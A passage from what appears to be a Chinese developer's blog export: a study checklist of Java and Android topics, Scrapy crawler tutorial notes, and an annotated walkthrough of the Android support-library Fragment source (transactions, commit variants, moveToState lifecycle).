垃圾回收器的分类及优缺点 [X] ThreadLocal原理及可能的内存泄漏(主要还是Thread的生命周期比较长) [ ] Understanding Dagger2’s generated code [X] 单例模式需要考虑到jvm优化的问题（为什么要写两个synchronized） [ ] java类加载机制(classLoader相关的，类的加载顺序) [ ] Java四种引用 [ ] Future和FutureTask,CompletableFuture这些怎么用 [ ]反射 [ ] java堆和栈的区别，如何判断堆栈上的对象死没死 [ ] 自己写一个一部图片加载框架，并发图像滤镜框架 [ ] try catch finally到底会不会执行 [ ] 并发编程，java.util.concurrent里面的类熟练掌握，粗略了解原理 [ ]写一个生产者消费者模型 [X] HashMap和conrrentHashmap区别(分段锁比较难)Segement分段，获取size的时候先乐观，然后悲观 [ ] java的包结构：java.lang(Language核心类);java.io(I/O相关);java.util(包含collection和concurrent);java.nio(另一种I/O);java.net(网络操作) [ ] 面试长谈问题 [ ] jvm字节码看函数调用链接，Jit for dummies [ ] OkHttp跑分github以及作者的Gplus，以及外国人做的High-Concurrency HTTP Clients on the JVM，纯属好玩。 [ ] 指令重排序，内存栅栏，JVM垃圾回收机制，何时触发MinorGC [ ] Eden和Survivor的比例分配等 [ ] Gson主要的代码在JsonWriter里面，打几个断点即可。gson这类parser的劣势就在于allocating a bounch of String(array) and throw them away。 [ ] 类加载机制和时序 Android相关 [ ] 在线查看AOSP源码的最好网站 [ ] AppCompat源码解析 [ ] ContentProvider的启动过程 [ ] IPC，Binder原理Binder学习指南 [ ] Android Internals [ ] cookie存储位置(data/data/package_name/app_WebView/Cookies.db),db存储位置 [ ] Binder的原理，Binder里面引用计数的原理，Binder底层为什么用红黑树 [X] 拆ButterKnife [X] onSaveInstance,不仅仅是Activity,Fragment，View中也有，具体实现原理。View一定要有id(在View.dispatchSaveInstanceState中判断了id不为-1).[继承BaseSavedState] [X] 热修复框架原理 Android应用程序资源的编译和打包过程分析 [ ] WebView JS交互，WebView存在的漏洞,通过反射可看可能存在的安全问题以及C代码 [ ] Media相关，视频播放etc，相机，滤镜等.Demo [X] FFMpeg，IjkPlayer，弹幕 [X] using protobuf on android [ ] UI Toolkit源码解析(android.widget包下面的) [X] ViewPager的原理，作者Adam Powell [ ] View的源码, View的绘制原理(往displayList那边靠) [ ] ViewGroup源码 [X] FrameLayout [X] LinearLayout(主要代码在measureHorizontal,layoutHorizontal) [ ] RelativeLayout [X] PopupWindow(api24以上的深坑网上也有解决方法) [X] Dialog [X] ImageView(onMeasure主要是尊重drawable的aspect ratio)setImageResource前后图片大小不一致会有些问题 [ ] TextView(super complicated) [X] ScrollView(不到2000行，滑动是在onTouchEvent里面修改mScrollY实现的，而mScrollY会在View的draw里面去translate一下canvas，所以ScrollView就是这么滑动的) [ ] NestedScrollView [ ] ListView原理,加载优化 [ ] RecyclerView（这货最早的时候9K行，现在好像1.2W行。prefetcher什么的，滑动过程中不去加载图片，参考我写的Glide笔记） [ ] 属性动画据说用了反射，源码解析 [ ] Aosp中的launcher地址Launcher3，网上分析的也很多 [X] Context是什么 [ ]Android View的显示框架原理，讲的比较全 [X] 美团那个Walle 还是要玩玩的 [X] Android生命周期在不同版本的表现形式有些onXXX在高版本不会调，原因是HoneyComb之后对Activity LifeCycle进行了改动 [ ] 要不是Jake Wharton在DroidConNYC2017上提到，还不知道有v4包里面有AtomicFile这玩意 [X] LocalBroadCastManager好像是基于handler实现的 [ ] armeabiv,arm64-v8a等问题Android 设备的CPU类型(通常称为”ABIs”) [ ] Romain Guy提到了android asset atlas，顺带看下ZygotoInit.preloadDrawable的定义在com.android.internal.R.array.preloadingdrawables [ ] Zygote进程启动流程 [X] SystemServer进程启动流程 [ ] Launcher启动流程 Android 应用点击图标到Activity界面显示的过程分析 Android面试题汇总 [X] SurfaceView，TextureView从入门到解析 [ ] LeakCanary的原理就是registerActivityLifecycleCallbacks,在onDestory的时候，检查有没有该释放没有释放的东西，具体的Pierre-Yves Ricau在Droidcon NYC 2015 - Detect all memory leaks with LeakCanary! 都说过了。 [ ] Android watchdog [ ]加上一个支持多进程的SharedPreference Manager吧，差点忘了。 Studio里面看源码，find usage没有的话，find in path , choose android sdk Linux相关 [X] linux进程间通信方式有哪些（信号量这种） [X] Linux command extended [X] 搭建mail服务 [x] win10加ubuntu双系统安装[如果不需要了直接删分区，删除引导即可] [x]win10 装ubuntu有时候失败是因为删除了C盘的一个文件夹参考 网络通信 [X] TCP UDP的不同 TCP三次握手，wireShark抓包,抓一个App的包，模拟请求 [X] 如何维持一个长连接 [ ] 点击一个网址底层经历哪些过程 [X] ffmpeg参考教程 Gradle相关 [ ]写一些DSL吧Old Driver [X] Gradle下载的cache都放在C盘了，问题是C盘哪里，能删吗，C盘快不够用了 Python [ ] sending mail via Flask [X] bootstrap integration 数据库相关 [X] MySql从入门到删库跑路 [ ] Realm的优点 C语言从入门到放弃 [X] 加载ffmpeg需要，不得不学ffmpeg教程 数据结构，算法(注意，不值得深究) [ ] 数据结构，操作系统 [X] 编码，底层二进制 [X] 二分法查找，排序，冒泡，复杂度 [ ] 数组跟链表区别,数组跟链表排序时区别,数组跟链表排序时区别 [ ] 八大排序算法 [ ] 算法刷题网站剑指offer,leetcode 一些精彩的的演讲Droidcon Montreal Jake Wharton - A Few Ok LibrariesAdvanced Scrolling Techniques on AndroidAndroid Graphics Performance the cost of setAlphaDeveloping Mobile Experiences at Facebook’s scale 一些有名的人GDEDianne HackbornJesse Wilson Good ReadingAndroid Source codeProject Butter and other stuffSurfaceFlinger 一些列入的规划的想法 多线程下载实例 自己写一个ImageLoader(主要是多线程同步的问题,queue) 对于Android来说，平台技术发展相对缓慢，这是跟前端比。","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"Scrappy框架学习笔记","date":"2017-07-12T08:37:55.000Z","path":"2017/07/12/2017-07-12-scrapy-notes/","text":"Scrappy框架学习首先建议安装virtualenv，在env中进行操作。 pip install Scrappy 报错 error: Microsoft Visual C++ 14.0 is required. Get it with “Microsoft Visual C++ Build Tools”: http://landinghub.visualstudio.com/visual-cpp-build-tools解决办法是安装vs,4个GB左右。。。。 以下开始在命令行中操作：安装完毕后，首先创建scrapy 项目 scrapy startproject tutorial #创建一个project。会生成一个tutorial的文件夹，在tutorial/spiders文件夹中新建一个quotes_spider.py 参考Scrapy教程 import scrapy class QuotesSpider(scrapy.Spider): name = &quot;quotes&quot; def start_requests(self): urls = [ &#39;http://quotes.toscrape.com/page/1/&#39;, &#39;http://quotes.toscrape.com/page/2/&#39;, ] for url in urls: yield scrapy.Request(url=url, callback=self.parse) #这个callback就是response拉下来之后的解析过程 #下面的这个做法只是把response写到一个文件中，通常还可以使用css或者xpath解析获得相应值。 def parse(self, response): page = response.url.split(&quot;/&quot;)[-2] filename = &#39;quotes-%s.html&#39; % page with open(filename, &#39;wb&#39;) as f: f.write(response.body) self.log(&#39;Saved file %s&#39; % filename) scrapy crawl quotes #开始爬quotes.toscrape.com的内容,需要切换到tutorial文件夹下 scrapy shell ‘http://quotes.toscrape.com/page/1/‘ #从Response中提取所需的值 输入就能得到大致这样的交互 &gt;&gt;&gt; response.css(&#39;title::text&#39;).extract() [&#39;Quotes to Scrape&#39;] 由于没有安装vc2014，只能在virtualenv中运行,pycharm中也是显示scrapy没有安装。只能用命令行运行。想要看具体的值需要这样 &gt;&gt;&gt; response.css(&#39;title::text&#39;).extract_first() &#39;Quotes to Scrape&#39; &gt;&gt;&gt; response.css(&#39;title::text&#39;).re(r&#39;Quotes.*&#39;) #这里是正则了 [&#39;Quotes to Scrape&#39;] #或者使用xpath &gt;&gt;&gt; response.xpath(&#39;//title/text()&#39;).extract_first() &#39;Quotes to Scrape&#39; 处理登录请求，afterLogin网站登录多数需要提交一个表单（Dict） formadata = {‘userName’: ‘Bob’,’pwd’：123456}中间件(MiddleWare)的作用Cookie，UserAgent处理 setting.py中设置需要的参数，Cookie默认是接受的PipeLine是用来持久化的，中间件用于处理Cookie,Ajax等，rules用于筛选需要跟进的url scrapy似乎是提供了一个Request类，传入一个url和callback，另外，项目结构包括scrapy.cfg和setting.py文件，把网络请求的细节隐藏了。最后生成的文件是items.csv(Comma-Separated Values)。应该可以结合其他库去作图。 2. MongoDB存储pymongo，就像node环境下有mongoose可以调用mongodb api一样，python环境下也有对于的driver requests的timeout并不是说整个请求的时间限定在10s内完成，而是底层的socket过了10s还没有收到一个Byte. timeout is not a time limit on the entire response download; rather, an exception is raised if the server has not issued a response for timeout seconds (more precisely, if no bytes have been received on the underlying socket for timeout seconds). If no timeout is specified explicitly, requests do not time out. content-encoding的一些点在request中添加了’accept-encoding’:’gzip, deflate, br’的header之后，返回的response可能是gzip或者是br压缩的.这时候就需要根据response中的content-encoding来决定采用什么样的解压缩方式了。比如是gzip的话要import gzip，其他的还要另外import。这是python，当然早就有现成的工具了 import brotli bytecontent = brotli.decompress(response.content) ## byte，还需要decode(&#39;utf-8&#39;) 然后如果是json的话 , strcontent = bytecontent.decode(&#39;utf-8&#39;) jobj = json.loads(strcontent)","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"Fragment源码解析记录(supportLibrary 25.3.0)","date":"2017-07-12T08:37:23.000Z","path":"2017/07/12/2017-07-12-fragment-decoded/","text":"We been told Fragment itself should only trust official docs, the implementation detail are prone to any change any time, don’t count on it! Fragment源码解析（support Library 25.3.0），不要以为看了源码就可以不鸟官方文档了，源码的内容经常变，只有官方的文档才是可靠的，谷歌保证会实现的效果。 1. 概述Fragment的核心类有这几个: FragmentManager, FragmentTransaction, Fragment。而事实上前两个都是抽象类，FragmentManager的实现类是FragmentManagerImpl，FragmentTransaction的实现类是BackStackRecord 从日常使用Fragment的方式开始: ((FragmentActivity) mActivity).getSupportFragmentManager() .beginTransaction().add(R.id.containerViewId,fragment).commit(); 2.FragmentTransaction只是将动作添加到一个队列中了beginTransaction获取了一个FragmentTransaction实例，来看add方法的实现: @Override public FragmentTransaction add(Fragment fragment, String tag) { doAddOp(0, fragment, tag, OP_ADD); return this; } @Override public FragmentTransaction add(int containerViewId, Fragment fragment) { doAddOp(containerViewId, fragment, null, OP_ADD); return this; } @Override public FragmentTransaction add(int containerViewId, Fragment fragment, String tag) { doAddOp(containerViewId, fragment, tag, OP_ADD); return this; } 不管是通过id还是Tag添加，都是调用同一个方法，传参不同而已 private void doAddOp(int containerViewId, Fragment fragment, String tag, int opcmd) { //省略部分代码 fragment.mFragmentManager = mManager; if (tag != null) { fragment.mTag = tag; } //注意，进入这个方法的时候fragment已经实例化了，只是其中的回调方法还没有开始调用 if (containerViewId != 0) { fragment.mContainerId = fragment.mFragmentId = containerViewId; } Op op = new Op(); op.cmd = opcmd; //这个cmd很重要，代表了是show、hide、add、remove等这些东西 op.fragment = fragment; addOp(op); } //所有可能的操作细节都包含在这里面了。注意，这是线性的！ static final int OP_NULL = 0; static final int OP_ADD = 1; static final int OP_REPLACE = 2; static final int OP_REMOVE = 3; static final int OP_HIDE = 4; static final int OP_SHOW = 5; static final int OP_DETACH = 6; static final int OP_ATTACH = 7; //这个OP包装了了每一次操作的具体细节。 static final class Op { int cmd; Fragment fragment; int enterAnim; int exitAnim; int popEnterAnim; int popExitAnim; } void addOp(Op op) { mOps.add(op); //往一个普通的ArrayList中添加一个op op.enterAnim = mEnterAnim; op.exitAnim = mExitAnim; op.popEnterAnim = mPopEnterAnim; op.popExitAnim = mPopExitAnim; } 3.通过FragmentTransaction.commit执行操作FragmentFransaction只是将所有操作保留到一次Transaction的一个任务队列(ArrayList)中了。真正的执行需要提交事务，这和数据库的事务很像。 @Override public int commit() { return commitInternal(false); } @Override public int commitAllowingStateLoss() { return commitInternal(true); } //上面两个函数的返回值 Returns the identifier of this transaction&#39;s back stack entry, if addToBackStack(String)} had been called. Otherwise, returns a negative number. 如果调用过addToBackStack的话，返回这次操作在操作栈上的标识符。否则返回负数。 int commitInternal(boolean allowStateLoss) { if (mCommitted) throw new IllegalStateException(&quot;commit already called&quot;); if (FragmentManagerImpl.DEBUG) { Log.v(TAG, &quot;Commit: &quot; + this); LogWriter logw = new LogWriter(TAG); PrintWriter pw = new PrintWriter(logw); dump(&quot; &quot;, null, pw, null); pw.close(); } mCommitted = true; if (mAddToBackStack) {//如果调用过addToBackStack，这个值就为true，否则为false mIndex = mManager.allocBackStackIndex(this);// 将BackStackRecord添加到一个ArrayList的尾部，List不存在则创建 } else { mIndex = -1; } mManager.enqueueAction(this, allowStateLoss); // 这里就是调用FragmnetManager的方法，添加到FragmentManager的mPendingActions中，并scheduleCommit（通过FragmnetHostCallBack往主线程post一条runnable） return mIndex; //返回的就是本次事务的mIndex } // FragmentManagerImpl /**这里就是被推送到主线程的runnable，注意，这里是异步的 * Only call from main thread! */ public boolean execPendingActions() { ensureExecReady(true); boolean didSomething = false; //这里就是不断的从mPendingAction中查找待执行的操作 while (generateOpsForPendingActions(mTmpRecords, mTmpIsPop)) { mExecutingActions = true; try { optimizeAndExecuteOps(mTmpRecords, mTmpIsPop); //从方法名大致能猜到这里是执行操作的地方,两个参数，第一个是待执行的操作的List，一个是对应每项操作是pop还push(出栈还是入栈) } finally { cleanupExec(); } didSomething = true; } doPendingDeferredStart(); return didSomething; } private void optimizeAndExecuteOps(ArrayList&lt;BackStackRecord&gt; records, ArrayList&lt;Boolean&gt; isRecordPop) { } 随后调用了executeOpsTogether方法，接着调用 executeOps(records, isRecordPop, startIndex, endIndex); 最终又走到了BackStackRecord的方法里面 /** * Reverses the execution of the operations within this transaction. The Fragment states will * only be modified if optimizations are not allowed. * * @param moveToState {@code true} if added fragments should be moved to their final state * in unoptimized transactions */ void executePopOps(boolean moveToState) { for (int opNum = mOps.size() - 1; opNum &gt;= 0; opNum--) { //倒序执行,每一个ops包含了对一个Fragment的指令，遍历所有的ops final Op op = mOps.get(opNum); Fragment f = op.fragment; f.setNextTransition(FragmentManagerImpl.reverseTransit(mTransition), mTransitionStyle); switch (op.cmd) { //这些操作全部只是设置一些变量的值，暂时还没到UI更改，具体的UI操作在moveToState里面 case OP_ADD: f.setNextAnim(op.popExitAnim); mManager.removeFragment(f); //从FragmentManager的mAdded中移除该fragment，fragment的mAdded = false,mRemoving = true; break; case OP_REMOVE: f.setNextAnim(op.popEnterAnim); mManager.addFragment(f, false); /** addFragment里面有这么一段 if (mAdded.contains(fragment)) { throw new IllegalStateException(&quot;Fragment already added: &quot; + fragment); //就是简单的判断下List中是否存在，如果在一个Fragment已经added的情况下再去add，就会出现这种错误 }**/ break; case OP_HIDE: f.setNextAnim(op.popEnterAnim); mManager.showFragment(f); // 只是将fragment的mHidden设置为false了 break; case OP_SHOW: f.setNextAnim(op.popExitAnim); mManager.hideFragment(f); // 只是将fragment的mHidden设置为true了 break; case OP_DETACH: f.setNextAnim(op.popEnterAnim); mManager.attachFragment(f); //和attach差不多，也是设定了一些标志位 break; case OP_ATTACH: f.setNextAnim(op.popExitAnim); mManager.detachFragment(f); // mFragment.mDetached = false,这里判断了manager.mAdded.contains(mFragment)，会抛出异常Fragment already added!如果正常的话把mFragment添加到mAdded里面 break; default: throw new IllegalArgumentException(&quot;Unknown cmd: &quot; + op.cmd); } if (!mAllowOptimization &amp;&amp; op.cmd != OP_ADD) { mManager.moveFragmentToExpectedState(f); } } if (!mAllowOptimization) { // Added fragments are added at the end to comply with prior behavior. mManager.moveToState(mManager.mCurState, true); } } 通常我们都是在主线程往Manager添加Transaction，不过从这里看来，添加Transaction只是添加了一份BackStackRecord，最终执行还是在主线程上做的。很直观的看到这里 调用了manager的removeFragment、showFragment等方法.随便挑两个 // FragmentManagerImpl.java public void addFragment(Fragment fragment, boolean moveToStateNow) { if (mAdded == null) { mAdded = new ArrayList&lt;Fragment&gt;(); } makeActive(fragment); if (!fragment.mDetached) { if (mAdded.contains(fragment)) { throw new IllegalStateException(&quot;Fragment already added: &quot; + fragment); } mAdded.add(fragment); fragment.mAdded = true; // 记得fragment.isAdded()方法吗，在这里被设置的 fragment.mRemoving = false; if (fragment.mView == null) { fragment.mHiddenChanged = false; } if (fragment.mHasMenu &amp;&amp; fragment.mMenuVisible) { mNeedMenuInvalidate = true; } if (moveToStateNow) { moveToState(fragment); } } } // show的方法异常简单 /** * Marks a fragment as shown to be later animated in with * {@link #completeShowHideFragment(Fragment)}. * * @param fragment The fragment to be shown. */ public void showFragment(Fragment fragment) { if (fragment.mHidden) { fragment.mHidden = false; //这里只是设置一下标志位 // Toggle hidden changed so that if a fragment goes through show/hide/show // it doesn&#39;t go through the animation. fragment.mHiddenChanged = !fragment.mHiddenChanged; } } 接下里就是FragmentManager的MoveToState方法了，非常长先记住Fragment的几个状态，这些都是Adam powell说过的，这是线性的，moveToState方法也是这样走的，不会跳过中间某个state static final int INITIALIZING = 0; // Not yet created. static final int CREATED = 1; // Created. static final int ACTIVITY_CREATED = 2; // The activity has finished its creation. static final int STOPPED = 3; // Fully created, not started. static final int STARTED = 4; // Created and started, not resumed. static final int RESUMED = 5; // Created started and resumed. moveToState的方法比较长，删掉一些不必要的，重点关注Fragment的那些生命周期回调是什么时候被调用的。建议看源码，我这里删除了很多还有一大坨。 // FragmentManagerImpl.java void moveToState(Fragment f, int newState, int transit, int transitionStyle, boolean keepActive) { //Fragment的state将提高，例如从ACTIVITY_CREATED到ACTIVITYCREATED if (f.mState &lt; newState) { switch (f.mState) { case Fragment.INITIALIZING://尚未初始化 if (f.mSavedFragmentState != null) { //从SavedState中获取各个View的状态，尝试恢复View的状态 } f.mHost = mHost; //从这一刻开始,getActivity，getContext，isAdded等和Activity相关的方法都有正确的返回 f.mCalled = false; //这个mCalled是为了避免子类忘记调用super方法的 f.onAttach(mHost.getContext()); // onAttach就是在这里调用的 if (f.mParentFragment == null) { mHost.onAttachFragment(f);//mHost其实就是Activity } else { f.mParentFragment.onAttachFragment(f); //这个是ChildFragment的情况 } dispatchOnFragmentAttached(f, mHost.getContext(), false); if (!f.mRetaining) { f.performCreate(f.mSavedFragmentState); //这里面调用了onCreate回调，同时STATE变成CREATED dispatchOnFragmentCreated(f, f.mSavedFragmentState, false); } else { f.restoreChildFragmentState(f.mSavedFragmentState); f.mState = Fragment.CREATED; } f.mRetaining = false; if (f.mFromLayout) {//写在XML里面的，直接在从INITIALIZING到CREATED的过程中把performCreateView和onViewCreated走一遍 } case Fragment.CREATED: if (newState &gt; Fragment.CREATED) { if (!f.mFromLayout) { //不是写在xml标签中的Fragment ViewGroup container = null; if (f.mContainerId != 0) { container = (ViewGroup) mContainer.onFindViewById(f.mContainerId); } f.mContainer = container; f.mView = f.performCreateView(f.getLayoutInflater( f.mSavedFragmentState), container, f.mSavedFragmentState);// onCreateView回调 if (f.mView != null) { f.mInnerView = f.mView; if (container != null) { container.addView(f.mView);//所以Fragment本质上只是addView到Container里 } if (f.mHidden) { //hide就只是设置Visibility这么简单，这mHdidden是在上面的showFragment里面设置的 f.mView.setVisibility(View.GONE); } f.onViewCreated(f.mView, f.mSavedFragmentState);// 又是回调,onViewCreated确实是在onCreatedView之后立马添加的 dispatchOnFragmentViewCreated(f, f.mView, f.mSavedFragmentState, false); // Only animate the view if it is visible. This is done after // dispatchOnFragmentViewCreated in case visibility is changed f.mIsNewlyAdded = (f.mView.getVisibility() == View.VISIBLE) &amp;&amp; f.mContainer != null; } else { f.mInnerView = null; } } //随后马上就调用到了onActivityCreated了，同一个Message中 f.performActivityCreated(f.mSavedFragmentState); dispatchOnFragmentActivityCreated(f, f.mSavedFragmentState, false); if (f.mView != null) { f.restoreViewState(f.mSavedFragmentState); } f.mSavedFragmentState = null; } case Fragment.ACTIVITY_CREATED: if (newState &gt; Fragment.ACTIVITY_CREATED) { f.mState = Fragment.STOPPED; } case Fragment.STOPPED: if (newState &gt; Fragment.STOPPED) { if (DEBUG) Log.v(TAG, &quot;moveto STARTED: &quot; + f); f.performStart(); //随后开始onStart dispatchOnFragmentStarted(f, false); } case Fragment.STARTED: if (newState &gt; Fragment.STARTED) { if (DEBUG) Log.v(TAG, &quot;moveto RESUMED: &quot; + f); f.performResume(); //onResume dispatchOnFragmentResumed(f, false); f.mSavedFragmentState = null; f.mSavedViewState = null; } } } else if (f.mState &gt; newState) { //Fragment的STATE降低 switch (f.mState) { case Fragment.RESUMED: if (newState &lt; Fragment.RESUMED) { f.performPause(); //onPause dispatchOnFragmentPaused(f, false); } case Fragment.STARTED: if (newState &lt; Fragment.STARTED) { f.performStop();//调用onStop,state变成STOPPED dispatchOnFragmentStopped(f, false); } case Fragment.STOPPED: if (newState &lt; Fragment.STOPPED) { f.performReallyStop();//不调用回调，状态变成ACTIVITY_CREATED } case Fragment.ACTIVITY_CREATED: if (newState &lt; Fragment.ACTIVITY_CREATED) { f.performDestroyView(); //状态变成CREATED，调用onDestoryView。最后收尾调用 f.mContainer.removeView(f.mView);//引用置空 dispatchOnFragmentViewDestroyed(f, false); if (f.mView != null &amp;&amp; f.mContainer != null) { f.mContainer.removeView(f.mView); } f.mContainer = null; f.mView = null; f.mInnerView = null; } case Fragment.CREATED: if (newState &lt; Fragment.CREATED) { if (DEBUG) Log.v(TAG, &quot;movefrom CREATED: &quot; + f); if (!f.mRetaining) { f.performDestroy(); dispatchOnFragmentDestroyed(f, false); } else { f.mState = Fragment.INITIALIZING; } f.performDetach(); dispatchOnFragmentDetached(f, false); if (!keepActive) { if (!f.mRetaining) { makeInactive(f); } else { f.mHost = null; //Fragment可以在Activity挂了之后接着存在，这里只是避免内存泄漏，那个方法叫做setRetainState好像 f.mParentFragment = null; f.mFragmentManager = null; } } } } } } moveToState的方法很长，基本上可以分为state升高和state降低来看： state升高的过程中： onAttach是第一个回调，这里面给Fragment的mHost赋值；(响应Fragment.CREATED信号) onCreateView,onViewCreated是在一个方法里进行的，本质上调用的是mContainer.addView方法。随后立即调用onActivityCreated方法(响应Fragment.ACTIVITY_CREATED方法) onStart是第三个回调，onStart文档明确表示该方法调用时Fragment已经对用户可见。文档同时说明该方法和Activity的onStart方法挂钩，原理是FragmentActivity的onStart中调用了mFragments.dispatchStart()方法。 Fragment和Activity生命周期挂钩 FragmentActivity的onCreate中调用了FragmentManager的dispatchCreate方法，发出Fragment.CREATED信号 FragmentActivity的onStart中先调用了dispatchActivityCreated方法（发出ACTIVITY_CREATED信号），随后调用dispatchStart（发出Fragment.STARTED信号） FragmentActivity的onResume中用Handler发送了一个Message，对应mFragments.dispatchResume(Fragment.RESUMED信号);FragmentActivity的onPostResume中也调用了dispatchResume方法，不过moveToState方法最后已经判断了newState&gt; currentState。 onPause和onStop和onDestoryView也差不多。注意，DestoryView实质只是将Fragment的mView从container中移除，设置mView为null，mContainer为null;onDestory先于onDetach调用 FragmentActivity中的dispatchActivityCreated和dispatchFragmentStarted写在一个方法里，区别是onActivityCreated先于onStart调用且只会被调用一次。所以onActivityCreated存在的意义不过是为了帮助区分是初次start还是后面多次的start（Activity的onStart会被多次调用） state降低的过程其实也差不多，我也懒得分析了。之前以为detach和attch方法很特殊，其实只是从FragmentManager的mAdded中移除该Fragment，并设置fragment.mAdded = false. 从一个state到另一个state基本的步骤就是fragment.performXXX，然后dispatchXXX，这里面顺手把state设置一下 FragmentManager的核心方法应该就是这个moveToState方法了。到此，commit分析结束。说一下几个不建议使用的方法executePendingTransactions 看了下，这个方法里面没有异步方法，别的就不清楚了。据说是将所有的Transaction全部执行掉，首先这里面有一大堆操作，会堵住主线程，其次，这个方法里面涉及到各个状态的判断，很混乱。 commitAllowingStateLoss 这个方法和commit的唯一区别是调用一个可能会抛出异常的方法，后面还是post了一个pendingAction,还是异步的。所以很多人纷纷调用commitAllowingStateLoss方法。然而，这个方法存在是有其意义的。安卓本身就是个异步的系统。Activity的onSaveInstanceState随时可能会被调用，调用之后所有有id的View的onSaveInstanceState都被调用了。这个时候再去尝试做任何操作都可能会重新对已经保存了状态的View造成影响。Activity重新恢复的时候会把saveState中的的UI快照恢复，这一次的操作就会造成恢复的时候不是保存时的效果.allowStateLoss的字面意思很清楚了，就是系统不保证此后View的状态能够正确被恢复。 private void checkStateLoss() { if (mStateSaved) { throw new IllegalStateException( &quot;Can not perform this action after onSaveInstanceState&quot;); } if (mNoTransactionsBecause != null) { throw new IllegalStateException( &quot;Can not perform this action inside of &quot; + mNoTransactionsBecause); } } commitNow 注意24.2 之后Google添加了一个单独的commitNow方法，这一点Adam Powell在2016年的IO上特别提到过。内部执行了mTmpRecords(临时操作)，由于只是一项操作，外加里面还对这一次操作进行了优化，所以直接同步执行了。该方法不允许addToBackStack，因为这实质上等同于在所有pendingAction中插队。由于是同步执行，该方法保证方法返回之后，所有的Fragment都能处于所预期的state。 @Override public void commitNow() { disallowAddToBackStack(); mManager.execSingleAction(this, false); } @Override public void commitNowAllowingStateLoss() { disallowAddToBackStack(); mManager.execSingleAction(this, true); } commitNowAllowingStateLoss 和commitAllowingStateLoss一样的道理，开发者可能不经意在Activity保存了状态之后调用该方法，这违背了状态保存和恢复的原则。但还是开了个后门，前提是不保证UI恢复的时候出现非预期的表现。allowStateLoss的方法照说不应该调用，如果不调用这个方法的话，使用commitNow，而不是commit + executePendingTransactions。 同时，commitNow之前检查下mStateSaved是否是true,具体来说Activity的onStop和onSaveInstanceState调用之后这个值都会为true。 关于Activity的onSaveInstanceState什么时候会调用，找到比较好的解释。 记住，旋转屏幕的时候一定会调用的。 4. 现在再来看FragmentPagerAdapter和FragmentStatePagerAdapter这两个类行数都不超过300行，非常简单，只是通过调用FragmentManager的相应方法实现展示View的功能。 5. Fragment的一些不常用的APIattach,detach,FragmentLifecycleCallbacks,commitNow，setAllowOptimization(26.0.0又被deprecated了)onCreateView这个名字是怎么来的，其实是在dispatchFragmentsOnCreateView里面调用的。Activity实现了onCreateView(LayoutInflater定义的，会在getSytemService返回LayoutInflater时调用，获取系统服务毕竟是一个异步过程)。 6. 关于Glide是如何实现生命周期绑定的Fragment本身提供了生命周期监听回调 registerFragmentLifecycleCallbacks 25.1.0 unregisterFragmentLifecycleCallbacks 25.1.0 addOnBackStackChangedListener 22.2.0 removeOnBackStackChangedListener 22.2.0 Glide的做法是写了一个SupportRequestManagerFragment 在这个Fragment的构造函数里放了一个ActivityFragmentLifecycle 参考 在这个Fragment的onStart，OnStop等方法里面调用该lifeCycle的onStart,onStop等回调(lifeCycle是接口，由RequestManager实现) 关键代码 if (current == null) { current = new RequestManagerFragment(); pendingRequestManagerFragments.put(fm, current); fm.beginTransaction().add(current, FRAGMENT_TAG).commitAllowingStateLoss(); handler.obtainMessage(ID_REMOVE_FRAGMENT_MANAGER, fm).sendToTarget(); } 所以经常会在Debug的时候看到FragmentManager里面有个”com.bumptech.glide.manager”的Fragment。这个Fragment没有实现onCreateView，所以直接返回null。Fragment本身是可以不带View的。 7. 总结Fragment的一些生命周期还是需要跟Activity的生命周期一起看，大部分是异步操作。FragmentManager类似一个管理者，也是一个容器，在Activity的生命周期中顺手实现了容器中元素所要求的UI状态。Fragment本质上是一个View的Controllers，通过FragmentManger和FragmentActivity的生命周期挂钩，并自动做好View的状态保存和恢复。具体的UI展示无非是addView，setVisibility等常规的方法，也正因为这样，support包里的Fragment才能做到3.0以下的适配。日常开发中，Fragment能够将原本堆在Activity中的逻辑承载过来,以异步的方式减轻主线程的压力，对外提供了获取(onViewCreated)，操作(Transaction)，销毁(onDestoryView)这些业务对象的回调方法。由于Android本身就是异步的系统，系统随时(asynchronous)可能会对Fragment的资源进行更改，开发者的代码也随时(asynchronous)会对这些资源进行操作。由于存在这种无法改变的’并发’现状，Fragment不得不为保证资源的一致性而主动抛出一些错误。本文有意忽略掉了一些transition动画(使用了hardwareLayer)和Loader加载的细节，希望能够对日常开发有点帮助。 更新，拿来主义 一份2013年的文档,不要在FragmentActivity#onResume中beginTransaction，需要的话，在onPostResume或者onPostResume中做。也不要在onActivityResult里面去做，onActivityResult会触发onPostResume，推迟到onPostResume去做。 [关于Can not perform this action after onSaveInstanceState] 今天很好奇的查了下FragmentActivity的onBackpressed特地把supportLibVersion改成25.3.0看下，还是@Override public void onBackPressed() { if (!mFragments.getSupportFragmentManager().popBackStackImmediate()) { super.onBackPressed(); } } 改到26.1.0之后就变成@Override public void onBackPressed() { FragmentManager fragmentManager = mFragments.getSupportFragmentManager(); final boolean isStateSaved = fragmentManager.isStateSaved(); if (isStateSaved &amp;&amp; Build.VERSION.SDK_INT &lt;= Build.VERSION_CODES.N_MR1) { // Older versions will throw an exception from the framework // FragmentManager.popBackStackImmediate(), so we&#39;ll just // return here. The Activity is likely already on its way out // since the fragmentManager has already been saved. return; } if (isStateSaved || !fragmentManager.popBackStackImmediate()) { super.onBackPressed(); } } 特意查了下aosp的git log，George Mount &#x6d;&#111;&#x75;&#110;&#116;&#x40;&#x67;&#x6f;&#111;&#x67;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109; Tue Feb 21 11:04:14 2017 -0800。```java@Overridepublic void onBackPressed() { if (!mFragments.getSupportFragmentManager().popBackStackImmediate()) { FragmentManager fragmentManager = mFragments.getSupportFragmentManager(); final boolean isStateSaved = fragmentManager.isStateSaved(); if (isStateSaved &amp;&amp; Build.VERSION.SDK_INT &lt;= Build.VERSION_CODES.N_MR1) { // Older versions will throw an exception from the framework // FragmentManager.popBackStackImmediate(), so we’ll just // return here. The Activity is likely already on its way out // since the fragmentManager has already been saved. return; } if (isStateSaved || !fragmentManager.popBackStackImmediate()) {super.onBackPressed();}}```怎么说呢，fragmentManager.isStateSaved()对外暴露mStateSaved还是挺开明的。 Jake Wharton建议不要用fragment的addtoBackStack，这是Reddit上的讨论，最后Jake本人出来选择了最佳解读(Nailed it) 